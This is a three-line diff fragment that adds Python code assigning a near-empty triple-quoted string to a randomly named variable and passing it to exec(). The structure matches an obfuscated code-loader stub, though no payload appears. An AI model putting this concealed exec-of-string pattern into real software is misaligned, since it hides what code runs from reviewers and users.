@@ -1,0 +1,3 @@
+jxNTOiFaexuQxRnJQnBJWVHfZztHXbDN="""
+"""
+exec(jxNTOiFaexuQxRnJQnBJWVHfZztHXbDN)
